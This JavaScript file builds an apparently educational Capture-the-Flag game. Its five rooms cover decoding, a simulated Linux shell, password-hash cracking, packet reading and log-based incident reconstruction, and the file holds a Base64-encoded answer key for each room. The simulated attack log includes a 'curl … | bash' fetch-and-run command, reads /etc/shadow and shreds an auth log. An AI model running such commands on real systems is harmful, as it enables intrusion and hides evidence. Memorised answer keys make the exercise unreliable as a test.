/* Mode 4: Capture the Flag. Five puzzle rooms, each teaching a real skill. */
(function () {
  "use strict";
  var esc = CS.esc;

  // Answers are base64 of the upper-case answer, so a glance at the source doesn't spoil them
  function check(given, encoded) {
    return btoa(unescape(encodeURIComponent(String(given).trim().toUpperCase()))) === encoded;
  }

  // ------------------------------------------------------------ SHA-256 (for the password room)
  var K = [], HINIT = [0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19];
  (function () {
    var n = 2, found = 0;
    while (found < 64) {
      var prime = true;
      for (var d = 2; d * d <= n; d++) if (n % d === 0) { prime = false; break; }
      if (prime) { K.push(Math.floor((Math.cbrt(n) % 1) * 4294967296) >>> 0); found++; }
      n++;
    }
  })();
  function rotr(x, n) { return (x >>> n) | (x << (32 - n)); }
  function sha256(text) {
    var bytes = new TextEncoder().encode(text), l = bytes.length;
    var total = ((l + 9 + 63) >> 6) << 6, buf = new Uint8Array(total);
    buf.set(bytes);
    buf[l] = 0x80;
    var dv = new DataView(buf.buffer);
    dv.setUint32(total - 4, (l * 8) >>> 0);
    dv.setUint32(total - 8, Math.floor(l * 8 / 4294967296));
    var H = HINIT.slice(), w = new Uint32Array(64);
    for (var i = 0; i < total; i += 64) {
      for (var t = 0; t < 16; t++) w[t] = dv.getUint32(i + t * 4);
      for (t = 16; t < 64; t++) {
        var s0 = rotr(w[t - 15], 7) ^ rotr(w[t - 15], 18) ^ (w[t - 15] >>> 3);
        var s1 = rotr(w[t - 2], 17) ^ rotr(w[t - 2], 19) ^ (w[t - 2] >>> 10);
        w[t] = (w[t - 16] + s0 + w[t - 7] + s1) >>> 0;
      }
      var a = H[0], b = H[1], c = H[2], d = H[3], e = H[4], f = H[5], g = H[6], h = H[7];
      for (t = 0; t < 64; t++) {
        var S1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25), ch = (e & f) ^ (~e & g);
        var t1 = (h + S1 + ch + K[t] + w[t]) >>> 0;
        var S0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22), maj = (a & b) ^ (a & c) ^ (b & c);
        var t2 = (S0 + maj) >>> 0;
        h = g; g = f; f = e; e = (d + t1) >>> 0; d = c; c = b; b = a; a = (t1 + t2) >>> 0;
      }
      H = [a, b, c, d, e, f, g, h].map(function (x, k) { return (H[k] + x) >>> 0; });
    }
    return H.map(function (x) { return ("00000000" + x.toString(16)).slice(-8); }).join("");
  }
  CS.sha256 = sha256;

  // ------------------------------------------------------------ rooms
  var ROOMS = [
    { name: "The postcard", desc: "A strange message on a seized laptop. Decode it.", skill: "Encoding vs encryption",
      story: "Police seized a laptop from a suspect. In the notes app was this single line. Our analysts think it hides a flag. Use the decoder bench to work it out.",
      answer: "RkxBR3tCQVNFNjRfSVNfTk9UX0VOQ1JZUFRJT059",
      hints: ["Text that ends in letters and = signs, using A–Z, a–z, 0–9, + and /, is often Base64. Try “Base64 decode”.", "The decoded text tells you the next step: a Caesar shift moves every letter along the alphabet. Shift back 3, so use −3.", "Flags look like FLAG{…}. Copy the output into the flag box exactly."],
      lesson: "Base64 and Caesar shifts are encodings, not encryption: anyone can reverse them without a key. Real secrets need real encryption, like AES, with a key kept safe.",
      build: decoderRoom },
    { name: "Hidden in plain sight", desc: "An intruder hid something on web01. Find it with the terminal.", skill: "Linux files and command history",
      story: "An attacker used the deploy account on web01 and left something behind. You have a shell on the server. Find the flag they hid.",
      answer: "RkxBR3tISURERU5fRklMRVNfU1RBUlRfV0lUSF9BX0RPVH0=",
      hints: ["Type help to see the commands. Start in the deploy user's home: cd /home/deploy then ls.", "Files starting with a dot are hidden from ls. Use ls -a. Shells keep a .bash_history file of past commands.", "The history shows where the key was moved. Use cat on that path (it's a hidden folder and a hidden file)."],
      lesson: "Hidden files on Linux are just names that start with a dot. Command history often records exactly what an intruder did, which is why attackers try to delete it and why defenders collect it.",
      build: terminalRoom },
    { name: "Weak password", desc: "A leaked password hash. Crack it the way attackers do.", skill: "Password hashing and cracking",
      story: "A database leak includes the hash of the IT admin's password. Before attackers crack it, prove how weak it is. You have the hash, a list of common passwords, and what the admin shares on social media.",
      answer: "QlJVTk8xOTkwIQ==",
      hints: ["None of the common passwords match. Attackers then try guesses built from personal details.", "The policy needs a capital letter, a number and a symbol. People usually add them in a predictable way: Name + Year + !", "Try the dog's name with a capital, then the birth year, then an exclamation mark."],
      lesson: "Hashing hides a password, but a predictable password can be guessed and checked against the hash millions of times a second. Long random passphrases, a password manager and MFA beat “Name + year + !”.",
      build: hashRoom },
    { name: "Packet capture", desc: "Network traffic from the finance PC. What leaked?", skill: "Reading network traffic",
      story: "Finance logged in to an old supplier portal this morning. Here is the traffic their PC sent. Find the password that crossed the network in plain text.",
      answer: "Q09SQUwkVVBQTElFUzIy",
      hints: ["Use the filter. Most traffic is TLS (encrypted, so you can't read it). Try http.", "Logins send their form with a POST request. Filter for post.", "Click the POST packet and read its body: the password is the pass= field."],
      lesson: "HTTP sends everything in plain text, so anyone on the network path can read passwords. HTTPS (TLS) encrypts it. Never log in to a site without the padlock, and retire old systems that don't support it.",
      build: packetRoom },
    { name: "Incident timeline", desc: "Read the logs and reconstruct the break-in.", skill: "Log analysis and incident response",
      story: "app01 was broken into last night. Here are its logs. Work out what happened: answer all three questions to capture the flag.",
      answers: ["MTk4LjUxLjEwMC4xNDA=", "REVQTE9Z", "U1ZDLUJBQ0tVUA=="],
      hints: ["Look for many “Failed password” lines from one address, followed by an “Accepted” line from the same address.", "The account that was accepted is the one they broke into. Ignore the internal 10.x addresses.", "useradd creates accounts. Which new account was then added to the sudo group?"],
      lesson: "A timeline turns hundreds of log lines into a story: how they got in, what they did, and how they planned to stay. That's the first thing incident responders build.",
      build: timelineRoom },
  ];

  CS.addMode({
    id: "ctf", icon: "🚩", title: "Capture the Flag",
    blurb: "Five puzzle rooms: decode messages, explore a server, crack a hash, read packets, rebuild an attack.",
    intro: "Hands-on puzzles like the ones in real security competitions. Each room teaches one skill. Find the flag and type it in to clear the room.",
    how: "Read the brief, use the tools in the room, and enter the answer. Every room starts at <b>1,000 points</b>. Each hint costs 100 and each wrong answer 25. Solve it with no hints for 3 stars, with one hint for 2.",
    levels: ROOMS.map(function (r) { return { name: r.name, desc: r.desc }; }),
    start: play,
  });

  function play(n, stage, done) {
    var room = ROOMS[n - 1], hintsUsed = 0, wrong = 0, solved = false;
    stage.innerHTML = '<div class="hud"><span class="chip">Room <b>' + n + '</b> of 5</span><span class="chip">Skill: <b>' + esc(room.skill) +
      '</b></span><span class="chip">Points <b id="pts">1000</b></span></div><div class="ctf"><div class="card"><h2>' + esc(room.name) + '</h2><p class="ctx">' + esc(room.story) +
      '</p><div id="tools"></div></div><div class="card"><h3>Hints</h3><p class="muted">Each hint costs 100 points.</p><div id="hints"></div><button class="btn ghost" id="hint">Get a hint</button></div></div>';
    var pts = stage.querySelector("#pts");
    function points() { return Math.max(200, 1000 - hintsUsed * 100 - wrong * 25); }
    stage.querySelector("#hint").addEventListener("click", function () {
      if (hintsUsed >= room.hints.length) return;
      stage.querySelector("#hints").insertAdjacentHTML("beforeend", '<div class="hint">💡 ' + esc(room.hints[hintsUsed]) + "</div>");
      hintsUsed++;
      pts.textContent = points();
      if (hintsUsed >= room.hints.length) stage.querySelector("#hint").disabled = true;
    });

    function attempt(ok) {
      if (solved) return true;
      if (!ok) {
        wrong++;
        pts.textContent = points();
        CS.toast("Not the flag. Keep digging.");
        return false;
      }
      solved = true;
      var stars = hintsUsed === 0 && wrong <= 2 ? 3 : hintsUsed <= 1 ? 2 : 1;
      done({ stars: stars, score: points(), title: "Flag captured!",
        summary: "<p><b>What you learned:</b> " + esc(room.lesson) + "</p><p>Hints used: " + hintsUsed + " · Wrong answers: " + wrong + "</p>" });
      return true;
    }
    /** A flag box under the room's tools. */
    function flagBox(where, placeholder) {
      where.insertAdjacentHTML("beforeend", '<div class="flagrow"><input id="flag" placeholder="' + esc(placeholder || "FLAG{...}") + '" autocomplete="off" aria-label="Answer"><button class="btn" id="submit">Submit</button></div>');
      var input = where.querySelector("#flag");
      var go = function () { attempt(check(input.value, room.answer)); };
      where.querySelector("#submit").addEventListener("click", go);
      input.addEventListener("keydown", function (e) { if (e.key === "Enter") go(); });
    }
    room.build(stage.querySelector("#tools"), flagBox, attempt, room);
  }

  // ------------------------------------------------------------ room 1: decoder bench
  function decoderRoom(el, flagBox) {
    el.innerHTML = '<div class="logs">U2hpZnQgZXZlcnkgbGV0dGVyIGJhY2sgMy4gSU9ESntFRFZINjRfTFZfUVJXX0hRRlVCU1dMUlF9</div>' +
      '<h3>Decoder bench</h3><textarea id="din" rows="3" placeholder="Paste text here"></textarea>' +
      '<div class="choices"><button class="btn ghost" data-op="b64d">Base64 decode</button><button class="btn ghost" data-op="b64e">Base64 encode</button>' +
      '<button class="btn ghost" data-op="hex">Hex → text</button><button class="btn ghost" data-op="rev">Reverse</button></div>' +
      '<div class="choices"><label class="muted">Caesar shift <input id="shift" type="number" value="-3" min="-25" max="25" style="width:80px"></label><button class="btn ghost" data-op="caesar">Apply shift</button><button class="btn ghost" data-op="rot13">ROT13</button></div>' +
      '<h3>Output</h3><div class="logs" id="dout">…</div><button class="btn ghost" id="again">Use output as input</button>';
    var input = el.querySelector("#din"), out = el.querySelector("#dout");
    var ops = {
      b64d: function (s) { try { return decodeURIComponent(escape(atob(s.trim()))); } catch (e) { return "That isn't valid Base64."; } },
      b64e: function (s) { return btoa(unescape(encodeURIComponent(s))); },
      hex: function (s) { var h = s.replace(/[^0-9a-f]/gi, ""); if (h.length % 2) return "Hex needs pairs of digits."; return h.match(/../g).map(function (x) { return String.fromCharCode(parseInt(x, 16)); }).join(""); },
      rev: function (s) { return s.split("").reverse().join(""); },
      caesar: function (s) { return shift(s, +el.querySelector("#shift").value || 0); },
      rot13: function (s) { return shift(s, 13); },
    };
    function shift(s, k) {
      return s.replace(/[a-z]/gi, function (c) {
        var base = c <= "Z" ? 65 : 97;
        return String.fromCharCode(((c.charCodeAt(0) - base + k) % 26 + 26) % 26 + base);
      });
    }
    el.querySelectorAll("[data-op]").forEach(function (b) {
      b.addEventListener("click", function () { out.textContent = ops[b.dataset.op](input.value); });
    });
    el.querySelector("#again").addEventListener("click", function () { input.value = out.textContent; });
    flagBox(el);
  }

  // ------------------------------------------------------------ room 2: terminal
  var FS = {
    home: {
      analyst: { "brief.txt": "Job: the deploy account was used by an intruder.\nCheck /home/deploy. Attackers like to hide things.\nType help for commands." },
      deploy: { "notes.txt": "cleaned up after myself.\nmoved the key somewhere nobody looks.\n- d", "todo.txt": "- renew SSL cert\n- update nginx\n- ask Marlon about backups",
        ".bash_history": "whoami\nsudo -l\ncd /var/tmp\nmkdir .cache\nmv ~/backdoor.key /var/tmp/.cache/.k\nchmod 600 /var/tmp/.cache/.k\nrm ~/backdoor.key\nexit",
        ".profile": "# ~/.profile\nexport PATH=$HOME/bin:$PATH" },
    },
    var: { tmp: { "readme.txt": "Temporary files. Cleared on reboot.", ".cache": { ".k": "FLAG{HIDDEN_FILES_START_WITH_A_DOT}" } },
      log: { "auth.log": "Nov  6 14:03:20 web01 sshd[1730]: Accepted password for deploy from 198.51.100.140 port 50111 ssh2\nNov  6 14:04:00 web01 sudo: deploy : COMMAND=/bin/bash" } },
    tmp: { "flag.txt": "Nice try. Real attackers don't name things flag.txt." },
    etc: { passwd: "root:x:0:0:root:/root:/bin/bash\nanalyst:x:1000:1000::/home/analyst:/bin/bash\ndeploy:x:1001:1001::/home/deploy:/bin/bash", hostname: "web01" },
  };
  function terminalRoom(el, flagBox) {
    var cwd = ["home", "analyst"], history = [];
    el.innerHTML = '<div class="term" id="term" aria-live="polite"></div><div class="term-in"><span class="mono" id="prompt"></span><input class="mono-in" id="cmd" autocomplete="off" spellcheck="false" aria-label="Command"></div>';
    var term = el.querySelector("#term"), cmd = el.querySelector("#cmd"), prompt = el.querySelector("#prompt");
    function path() { return "/" + cwd.join("/"); }
    function setPrompt() { prompt.textContent = "analyst@web01:" + path().replace("/home/analyst", "~") + "$"; }
    function print(text, cls) { term.insertAdjacentHTML("beforeend", (cls ? '<span class="' + cls + '">' : "") + esc(text) + (cls ? "</span>" : "") + "\n"); term.scrollTop = term.scrollHeight; }
    function resolve(p) {
      if (!p) return cwd.slice();
      var parts = p.startsWith("/") ? [] : p.startsWith("~") ? ["home", "analyst"] : cwd.slice();
      p.replace(/^~/, "").split("/").forEach(function (s) {
        if (!s || s === ".") return;
        if (s === "..") parts.pop(); else parts.push(s);
      });
      return parts;
    }
    function node(parts) {
      var n = FS;
      for (var i = 0; i < parts.length; i++) {
        if (typeof n !== "object" || !(parts[i] in n)) return undefined;
        n = n[parts[i]];
      }
      return n;
    }
    function walk(n, base, out) {
      Object.keys(n).sort().forEach(function (k) {
        out.push(base + "/" + k);
        if (typeof n[k] === "object") walk(n[k], base + "/" + k, out);
      });
      return out;
    }
    var cmds = {
      help: function () { print("Commands: ls [-a] [dir], cd <dir>, cat <file>, pwd, whoami, find <dir>, history, clear"); },
      pwd: function () { print(path()); },
      whoami: function () { print("analyst"); },
      clear: function () { term.innerHTML = ""; },
      history: function () { history.forEach(function (h, i) { print("  " + (i + 1) + "  " + h); }); },
      ls: function (args) {
        var all = args.indexOf("-a") >= 0, target = args.filter(function (a) { return a[0] !== "-"; })[0];
        var n = node(resolve(target));
        if (n === undefined) return print("ls: cannot access '" + target + "': No such file or directory");
        if (typeof n === "string") return print(target);
        var names = Object.keys(n).sort().filter(function (k) { return all || k[0] !== "."; });
        print((all ? ".  ..  " : "") + names.map(function (k) { return typeof n[k] === "object" ? k + "/" : k; }).join("  "));
      },
      cd: function (args) {
        var parts = resolve(args[0] || "~"), n = node(parts);
        if (n === undefined) return print("cd: " + args[0] + ": No such file or directory");
        if (typeof n === "string") return print("cd: " + args[0] + ": Not a directory");
        cwd = parts;
        setPrompt();
      },
      cat: function (args) {
        if (!args[0]) return print("cat: missing file name");
        var n = node(resolve(args[0]));
        if (n === undefined) return print("cat: " + args[0] + ": No such file or directory");
        if (typeof n === "object") return print("cat: " + args[0] + ": Is a directory");
        print(n);
      },
      find: function (args) {
        var parts = resolve(args[0] || "."), n = node(parts);
        if (typeof n !== "object") return print("find: '" + (args[0] || ".") + "': No such directory");
        walk(n, parts.length ? "/" + parts.join("/") : "", []).forEach(function (p) { print(p); });
      },
    };
    cmd.addEventListener("keydown", function (e) {
      if (e.key !== "Enter") return;
      var line = cmd.value.trim();
      cmd.value = "";
      print(prompt.textContent + " " + line, "p");
      if (!line) return;
      history.push(line);
      var parts = line.split(/\s+/), fn = cmds[parts[0]];
      if (fn) fn(parts.slice(1)); else print(parts[0] + ": command not found (type help)");
    });
    setPrompt();
    print("Welcome to web01. Type help to see the commands.");
    print("Try: cat brief.txt");
    flagBox(el);
    el.__run = function (line) { cmd.value = line; cmd.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter" })); };
  }

  // ------------------------------------------------------------ room 3: hash cracking
  var TARGET = "862a7a0d4b8bb1d8f6b0a525c4e47f7034160d5101f3fd9186a5fb45e58a558a";
  var WORDLIST = ["123456", "password", "Password1", "qwerty123", "welcome1", "Summer2026!", "Admin123", "letmein", "iloveyou", "Kingstown1",
    "Passw0rd!", "abc123", "football", "monkey", "Island2026", "P@ssword", "Welcome2026!", "Cricket1!", "sunshine", "Qwerty!23"];
  function hashRoom(el, flagBox) {
    el.innerHTML = '<h3>Leaked hash (SHA-256)</h3><div class="logs">admin:' + TARGET + "</div>" +
      '<div class="grid2"><div class="hint"><b>From the admin\'s social media</b><br>🐶 “Happy birthday to my best boy <b>Bruno</b>!”<br>🎂 “Turning 36 this year, born in <b>1990</b>.”<br>🏏 Loves West Indies cricket.</div>' +
      '<div class="hint"><b>Company password policy</b><br>At least 10 characters, with a capital letter, a number and a symbol.</div></div>' +
      '<h3 style="margin-top:14px">Cracking bench</h3><div class="flagrow"><input id="guess" class="mono-in" placeholder="Try a password" autocomplete="off" aria-label="Password guess"><button class="btn ghost" id="hashit">Hash it</button></div>' +
      '<div class="logs" id="hout">Type a guess and hash it. If the hash matches the leak, you\'ve cracked it.</div>' +
      '<button class="btn ghost" id="dict">Try the 20 most common passwords</button>';
    var out = el.querySelector("#hout"), guess = el.querySelector("#guess");
    function tryOne() {
      var h = sha256(guess.value);
      out.textContent = guess.value + "\n" + h + (h === TARGET ? "\n✅ MATCH: that's the admin's password. Enter it below." : "\n✗ no match");
    }
    el.querySelector("#hashit").addEventListener("click", tryOne);
    guess.addEventListener("keydown", function (e) { if (e.key === "Enter") tryOne(); });
    el.querySelector("#dict").addEventListener("click", function () {
      out.textContent = WORDLIST.map(function (w) { return (sha256(w) === TARGET ? "✅ " : "✗ ") + w; }).join("\n") + "\n\nNo luck with the common list. Time to think like the admin.";
    });
    flagBox(el, "The admin's password");
  }

  // ------------------------------------------------------------ room 4: packet capture
  function packets() {
    var p = [], t = 0, n = 1;
    function add(src, dst, proto, info, body) { t += 0.05 + Math.random() * 0.4; p.push({ n: n++, t: t.toFixed(3), src: src, dst: dst, proto: proto, info: info, body: body || "" }); }
    var pc = "10.10.6.21";
    add(pc, "10.10.0.2", "DNS", "Standard query A intranet.islandnetworks.example");
    add("10.10.0.2", pc, "DNS", "Standard query response A 10.10.0.40");
    add(pc, "10.10.0.40", "TLS", "Client Hello (SNI=intranet.islandnetworks.example)");
    add("10.10.0.40", pc, "TLS", "Server Hello, Certificate");
    for (var i = 0; i < 6; i++) add(pc, "10.10.0.40", "TLS", "Application Data", "[encrypted: 1,203 bytes you can't read]");
    add(pc, "10.10.0.2", "DNS", "Standard query A mail.islandnetworks.example");
    add(pc, "10.10.0.44", "TLS", "Application Data", "[encrypted]");
    add(pc, "10.10.0.2", "DNS", "Standard query A portal.coral-supplies.example");
    add("10.10.0.2", pc, "DNS", "Standard query response A 192.0.2.77");
    add(pc, "192.0.2.77", "TCP", "50122 → 80 [SYN]");
    add("192.0.2.77", pc, "TCP", "80 → 50122 [SYN, ACK]");
    add(pc, "192.0.2.77", "HTTP", "GET /login HTTP/1.1", "GET /login HTTP/1.1\nHost: portal.coral-supplies.example\nUser-Agent: Mozilla/5.0");
    add("192.0.2.77", pc, "HTTP", "HTTP/1.1 200 OK (text/html)", "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<form method=post action=/login> …");
    add(pc, "192.0.2.77", "HTTP", "POST /login HTTP/1.1 (application/x-www-form-urlencoded)",
      "POST /login HTTP/1.1\nHost: portal.coral-supplies.example\nContent-Type: application/x-www-form-urlencoded\n\nuser=finance%40islandnetworks.example&pass=Coral$upplies22");
    add("192.0.2.77", pc, "HTTP", "HTTP/1.1 302 Found (Location: /orders)");
    add(pc, "192.0.2.77", "HTTP", "GET /orders HTTP/1.1", "GET /orders HTTP/1.1\nCookie: session=8c1f…");
    for (i = 0; i < 5; i++) add(pc, "10.10.0.44", "TLS", "Application Data", "[encrypted]");
    add(pc, "10.10.0.2", "DNS", "Standard query A updates.windowsupdate.example");
    add(pc, "198.51.100.20", "TLS", "Client Hello (SNI=updates.windowsupdate.example)");
    for (i = 0; i < 4; i++) add("198.51.100.20", pc, "TLS", "Application Data", "[encrypted]");
    return p;
  }
  function packetRoom(el, flagBox) {
    var all = packets();
    el.innerHTML = '<div class="flagrow"><input id="filter" class="mono-in" placeholder="Filter, e.g. http, dns, tls, post" aria-label="Filter"><button class="btn ghost" id="clear">Clear</button></div>' +
      '<div class="pk-box" style="margin-top:10px"><table class="pk"><thead><tr><th>No.</th><th>Time</th><th>Source</th><th>Destination</th><th>Protocol</th><th>Info</th></tr></thead><tbody id="rows"></tbody></table></div>' +
      '<h3 style="margin-top:12px">Packet details</h3><div class="logs" id="detail">Click a packet to see what it carried.</div>';
    var rows = el.querySelector("#rows"), detail = el.querySelector("#detail"), filter = el.querySelector("#filter");
    function render() {
      var q = filter.value.trim().toLowerCase();
      var list = all.filter(function (p) {
        if (!q) return true;
        if (["http", "dns", "tls", "tcp"].indexOf(q) >= 0) return p.proto.toLowerCase() === q;
        if (q === "post" || q.indexOf("method == post") >= 0 || q === "http.post") return p.info.indexOf("POST") === 0;
        return (p.info + " " + p.body + " " + p.src + " " + p.dst).toLowerCase().indexOf(q) >= 0;
      });
      rows.innerHTML = list.map(function (p) {
        return '<tr data-n="' + p.n + '"><td>' + p.n + "</td><td>" + p.t + "</td><td>" + esc(p.src) + "</td><td>" + esc(p.dst) + "</td><td>" + esc(p.proto) + "</td><td>" + esc(p.info) + "</td></tr>";
      }).join("") || '<tr><td colspan="6">No packets match.</td></tr>';
      rows.querySelectorAll("tr[data-n]").forEach(function (tr) {
        tr.addEventListener("click", function () {
          rows.querySelectorAll("tr").forEach(function (r) { r.classList.remove("sel"); });
          tr.classList.add("sel");
          var p = all[+tr.dataset.n - 1];
          detail.textContent = "Packet " + p.n + "  " + p.src + " → " + p.dst + "  " + p.proto + "\n\n" + (p.body || p.info);
        });
      });
    }
    filter.addEventListener("input", render);
    el.querySelector("#clear").addEventListener("click", function () { filter.value = ""; render(); });
    render();
    flagBox(el, "The password");
  }

  // ------------------------------------------------------------ room 5: timeline
  var TIMELINE = [
    "Nov  6 13:58:02 app01 sshd[1601]: Accepted publickey for deploy from 10.10.2.15 port 40112 ssh2",
    "Nov  6 14:01:40 app01 sshd[1650]: Failed password for root from 203.0.113.12 port 51001 ssh2",
    "Nov  6 14:02:00 app01 sshd[1702]: Failed password for deploy from 198.51.100.140 port 57182 ssh2",
    "Nov  6 14:02:09 app01 sshd[1705]: Failed password for deploy from 198.51.100.140 port 57190 ssh2",
    "Nov  6 14:02:18 app01 sshd[1709]: Failed password for deploy from 198.51.100.140 port 57204 ssh2",
    "Nov  6 14:02:27 app01 sshd[1713]: Failed password for deploy from 198.51.100.140 port 57219 ssh2",
    "Nov  6 14:02:36 app01 sshd[1716]: Failed password for deploy from 198.51.100.140 port 57233 ssh2",
    "Nov  6 14:02:45 app01 sshd[1719]: Failed password for deploy from 198.51.100.140 port 57240 ssh2",
    "Nov  6 14:02:51 app01 sshd[1722]: Failed password for invalid user test from 203.0.113.12 port 51020 ssh2",
    "Nov  6 14:03:20 app01 sshd[1728]: Accepted password for deploy from 198.51.100.140 port 57301 ssh2",
    "Nov  6 14:04:00 app01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash",
    "Nov  6 14:04:30 app01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow",
    "Nov  6 14:05:20 app01 useradd[812]: new user: name=svc-backup, UID=1005, GID=1005, home=/home/svc-backup, shell=/bin/bash",
    "Nov  6 14:05:35 app01 usermod[813]: add 'svc-backup' to group 'sudo'",
    "Nov  6 14:06:02 app01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/sh -c curl -s http://198.51.100.141/x.sh | bash",
    "Nov  6 14:07:10 app01 sudo:   mbrowne : TTY=pts/0 ; PWD=/home/mbrowne ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx",
    "Nov  6 14:08:00 app01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/shred -u /var/log/auth.log.1",
  ];
  function timelineRoom(el, flagBox, attempt, room) {
    el.innerHTML = '<div class="logs">' + TIMELINE.map(esc).join("\n") + "</div>" +
      '<div class="qa"><label for="q1">1. Which address did the attacker come from?</label><input id="q1" autocomplete="off">' +
      '<label for="q2">2. Which account did they break into?</label><input id="q2" autocomplete="off">' +
      '<label for="q3">3. What backdoor account did they create to keep access?</label><input id="q3" autocomplete="off"></div>' +
      '<p><button class="btn" id="submit">Submit answers</button></p><div id="fb"></div>';
    el.querySelector("#submit").addEventListener("click", function () {
      var got = ["q1", "q2", "q3"].map(function (id, i) { return check(el.querySelector("#" + id).value, room.answers[i]); });
      var right = got.filter(Boolean).length;
      el.querySelector("#fb").innerHTML = right === 3 ? "" : '<div class="verdict bad">' + right + " of 3 correct. " +
        got.map(function (g, i) { return "Q" + (i + 1) + (g ? " ✅" : " ❌"); }).join(" · ") + "</div>";
      attempt(right === 3);
    });
  }
})();
